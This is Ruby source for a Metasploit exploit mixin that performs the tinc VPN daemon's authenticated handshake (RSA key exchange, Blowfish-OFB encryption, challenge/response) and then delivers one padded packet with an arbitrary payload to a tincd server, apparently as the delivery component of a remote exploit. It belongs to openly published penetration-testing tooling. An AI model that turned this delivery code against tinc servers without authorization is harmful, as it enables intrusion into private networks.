##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
#

require 'msf/core'
require 'msf/core/exploit/tcp'

require 'securerandom'
require 'openssl'
require 'digest/sha1'

module Msf

# This module does a handshake with a tincd server and sends one padded packet
# Author: Tobias Ospelt <tobias at modzero dot ch> @floyd_ch
module Exploit::Remote::TincdExploitClient
  include Msf::Exploit::Remote::Tcp

  def initialize(info={})
    super
    register_options(
      [ Opt::RPORT(655),
        # As this is a post-auth module, you should know the value of the following variables by simply checking
        # your configuration.
        OptPath.new('SERVER_PUBLIC_KEY_FILE',  [ true, 'Server\'s public key', '' ]),
        OptPath.new('CLIENT_PRIVATE_KEY_FILE', [ true, 'Client private key', '']),
        # You should see CLIENT_NAME in cleartext in the first message to the server by your usual tinc client (tcpdump or
        # wireshark it: e.g. "0 home 17.0", so it's "home"). On the server, this is located in the config folder, e.g. in FreeBSD
        # there is the client public key file /usr/local/etc/tinc/hosts/home for the client "home"
        # If you don't have a clue, maybe just try the filename of your private key without file extension
        OptString.new('CLIENT_NAME', [true, 'Your client name (pre-shared with server)' , '']),
      ], self
    )
  end

  def setupCiphers
    @state = :idState
    @buffer = ""
    @inbuffer = ""
    @encryption_queue = []
    @decryption_queue = ""

    @packet_payload = nil
    @keepReadingSocket = false

    # IMPORTANT: This class is untested with other lengths
    @bfblocksize =  64/8
    @key_len = 256
    print_status("Assuming challenge (key) length of %d" % @key_len)

    @client_private_key_cipher = nil
    @hex_enc_key_S1 = nil
    @bf_enc_cipher = nil
    self.initCiphers(datastore['SERVER_PUBLIC_KEY_FILE'], datastore['CLIENT_PRIVATE_KEY_FILE'])
    print_status("Ciphers locally initalized, private key and public key files seem to be ok")
    @bf_dec_cipher = nil
  end

  def sendPacketToTincServer(packet_payload)
    @packet_payload = packet_payload
    @keepReadingSocket = true
    connect
    begin
      self.id() # send the first message
      while @keepReadingSocket
        data = sock.get_once
        self.process_data(data)
      end
      disconnect
    rescue Errno::ECONNRESET => e
      if @state == :metakeyState
        print_error("Server reset the connection. Probably rejecting the private "\
        "key and/or client name (e.g. client name not associated with client public key on server side). "\
        "Wrong server public key possible too. "\
        "Please recheck client name, client private key and server public key.")
      else
        print_error("Server reset the connection, reason unknown.")
      end
    end
  end

  def initCiphers(server_file, client_file)
    server_public_key_cipher = OpenSSL::PKey::RSA.new(File.read(server_file))
    @client_private_key_cipher = OpenSSL::PKey::RSA.new(File.read(client_file))

    encryptionSuccessful = false
    while not encryptionSuccessful
      begin
        key_S1 = SecureRandom.random_bytes(@key_len)
        # can happen here:
        # `public_encrypt': data too large for modulus (OpenSSL::PKey::RSAError)
        enc_key_S1 = server_public_key_cipher.public_encrypt(key_S1, OpenSSL::PKey::RSA::NO_PADDING)
        encryptionSuccessful = true
      rescue OpenSSL::PKey::RSAError => e
        # the while loop will take care
      end
    end

    @hex_enc_key_S1 = enc_key_S1.unpack("H*")[0]

    # setup encryption
    bf_enc_key = key_S1[240...256]
    bf_enc_iv = key_S1[232...240]

    @bf_enc_cipher = OpenSSL::Cipher::Cipher.new("BF-OFB")
    @bf_enc_cipher.encrypt
    @bf_enc_cipher.key = bf_enc_key
    @bf_enc_cipher.iv = bf_enc_iv

    # #Looks like ruby openssl supports other lengths than multiple of 8!
    # test = @bf_enc_cipher.update("A"*10)
    # test << @bf_enc_cipher.final
    # puts "Testing cipher: "+test.unpack("H*")[0]
  end

  def process_data(data)
    @inbuffer += data
    case @state 
      when :idState
        if(self.has_line())
          data = self.get_line()
          print_status("Received ID from server: [%s]" % (data[0..30]))
          @state = :metakeyState # next expected state
          self.metakey()
        end
      when :metakeyState
        if self.has_line()
          data = get_line()
          print_status("Received Metakey from server: [%s...]" % (data[0..30]))
          data = data.split(" ")
          raise "Error in protocol. The first byte should be an ASCII 1." unless data[0] == "1"
          hexkey_S2 = data[5].rstrip # ("\n")
          raise "Error in protocol. hexkey_S2 length should be %d." % @key_len*2 unless hexkey_S2.length == @key_len*2
          @enckey_S2 = [hexkey_S2].pack("H*")
          key_S2 = @client_private_key_cipher.private_decrypt(@enckey_S2, OpenSSL::PKey::RSA::NO_PADDING)

          # setup decryption
          bf_dec_key = key_S2[240..256]
          bf_dec_iv = key_S2[232..240]

          @bf_dec_cipher = OpenSSL::Cipher::Cipher.new "BF-OFB"
          @bf_dec_cipher.encrypt
          @bf_dec_cipher.key = bf_dec_key
          @bf_dec_cipher.iv = bf_dec_iv
          # don't forget, it *does* matter if you do a
          # @bf_dec_cipher.reset or not, we're in OFB mode. DON'T.
          print_status("Crypto handshake/exchange completed")
          @state = :challengeState
          self.challenge()
        end
      when :challengeState
        need_len = 515
        if @inbuffer.length >= need_len
          data = self.pop_inbuffer_and_decrypt(need_len)
          print_status("Received challenge from server: [%s...]" % data.unpack("H*")[0][0..30])
          data = data.split(" ", 2)
          raise "Error in protocol. The first byte should be an ASCII 2." unless data[0] == "2"
          challenge2 = data[1][0...512]
          challenge2 = [challenge2].pack("H*")
          raise "Error in protocol. challenge2 length should be %d." % @key_len unless challenge2.length == @key_len
          @state = :challengeReplyState
          self.challenge_reply(challenge2)
        end
      when :challengeReplyState
        need_len = 43
        if @inbuffer.length >= need_len
          data = self.pop_inbuffer_and_decrypt(need_len)
          print_status("Received challenge reply from server: [%s...]" % data.unpack("H*")[0][0..30])
          @state = :ackState
          self.ack()
        end
      when :ackState
        need_len = 12
        if @inbuffer.length >= need_len
          data = self.pop_inbuffer_and_decrypt(need_len)
          print_status("Received ack (server accepted challenge response): [%s...]" % data.unpack("H*")[0][0..30])
          @state = :doneState
          self.send_packet()
        end
    end
  end

  def handle_write
    # handle encryption queue first
    if @encryption_queue.length > 0
      msg = @encryption_queue[0]
      @encryption_queue.delete_at(0)
      @buffer = @bf_enc_cipher.update(msg)
      @buffer << @bf_enc_cipher.final
      # DON'T DO A @bf_enc_cipher.reset, we're in OFB mode and 
      # the resulting block is used to encrypt the next block.
    end

    if @buffer.length > 0
      sent = self.send_data(@buffer)
      print_status("Sent %d bytes: [%s...]" % [sent, @buffer.unpack("H*")[0][0..30]])
      @buffer = @buffer[sent..@buffer.length]
    end
  end

  def send_data(buf)
    sock.put(buf)
    return buf.length
  end

  def pop_inbuffer_and_decrypt(size)
    @decryption_queue = pop_inbuffer(size)
    # In ruby openssl OFM works not only on full blocks, but also on
    # parts. Therefore no worries like in pycrypto and no
    # modified decrypt routine, simply use the cipher as is.
    data = @bf_dec_cipher.update(@decryption_queue)
    data << @bf_dec_cipher.final
    # DON'T DO A @bf_enc_cipher.reset, we're in OFB mode and 
    # the resulting block is used to decrypt the next block.
    @decryption_queue = ""
    return data
  end

  def pop_inbuffer(size)
    data = @inbuffer[0...size]
    if size >= @inbuffer.length
      @inbuffer = ""
    else
      @inbuffer = @inbuffer[size+1..@inbuffer.length]
    end
    return data
  end

  def get_line
    idx = @inbuffer.index("\n")
    data = self.pop_inbuffer(idx)
    return data
  end

  def has_line
    if @inbuffer.match("\n")
      return true
    else
      return false
    end
  end

  def id
    msg = "0 %s 17.0\n" % datastore['CLIENT_NAME']
    print_status("Sending ID (cleartext): [%s]" % msg.gsub("\n",""))
    @buffer += msg
    self.handle_write()
  end

  def metakey
    msg = "1 94 64 0 0 %s\n" % (@hex_enc_key_S1)
    print_status("Sending metakey (cleartext): [%s...]" % msg[0..30])
    @buffer += msg
    self.handle_write()
  end

  def challenge
    print_status("Sending challenge (ciphertext)")
    challenge = SecureRandom.random_bytes(@key_len)
    msg = "2      %s\n" % (challenge.unpack("H*")[0])
    @encryption_queue.push(msg)
    self.handle_write()
  end

  def challenge_reply(challenge2)
    print_status("Sending challenge reply (ciphertext)")
    h = Digest::SHA1.hexdigest(challenge2)
    msg = "3      %s\n" % (h.upcase)
    @encryption_queue.push(msg)
    self.handle_write()
  end

  def ack
    print_status("Sending ack (signalise server that we accept challenge reply, ciphertext)")
    @encryption_queue.push("4 %d 123 0    \n" % (datastore['RPORT']))
    self.handle_write()
  end

  def send_packet
    print_status("Protocol finished setup. Going to send data.")
    msg = "17 %d\n%s" % [@packet_payload.length, @packet_payload]
    plen = @bfblocksize - (msg.length % @bfblocksize)
    # padding
    msg += "B" * plen
    @encryption_queue.push(msg)
    self.handle_write()
  end
  def end_receiving_packets
    @keepReadingSocket = false
  end
end

end
